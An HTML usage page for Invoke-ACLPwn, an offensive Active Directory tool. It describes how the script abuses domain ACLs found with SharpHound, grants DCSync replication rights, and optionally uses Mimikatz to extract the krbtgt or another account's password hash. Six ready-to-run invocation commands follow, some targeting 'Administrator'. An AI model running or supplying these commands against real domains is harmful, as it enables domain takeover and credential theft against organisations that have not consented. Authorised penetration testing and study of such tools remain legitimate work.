<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Usage</title>
</head><body>https://github.com/fox-it/Invoke-ACLPwn<br/>
<br/>
Uses SharpHound.exe (bloodhound) to enumerate all ACLs on the domain<br/>
When the chain has been calculated, the script will then start to exploit every step in the chain:<br/>
<ul><li style="list-style-type: none">The user is added to the necessary groups</li>
<li style="list-style-type: none">Two ACEs are added to the ACL of the domain object:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Replicating Directory Changes</li>
<li style="list-style-type: none">Replicating Directory Changes All</li>
</ul>
</li>
<li style="list-style-type: none">Optionally, Mimkatzâ€™ DCSync feature is invoked and the hash of the given user account is requested. By default the krbtgt account will be used.</li>
</ul>
<br/>
After the exploitation is done, the script will remove the group memberships that were added during exploitation as well as the ACEs in the ACL of the domain object.<br/>
<br/>
<img src="image.png" /><br/>
<br/>
Example usage:<br/>
<br/>
&nbsp; &nbsp; ./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -NoDCSync<br/>
&nbsp; &nbsp; ./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe<br/>
&nbsp; &nbsp; ./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -userAccountToPwn 'Administrator'<br/>
&nbsp; &nbsp; ./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -LogToFile<br/>
&nbsp; &nbsp; ./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -NoSecCleanup<br/>
&nbsp; &nbsp; ./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'testuser' -Domain 'xenoflux.local' -Password 'Welcome01!'</body></html>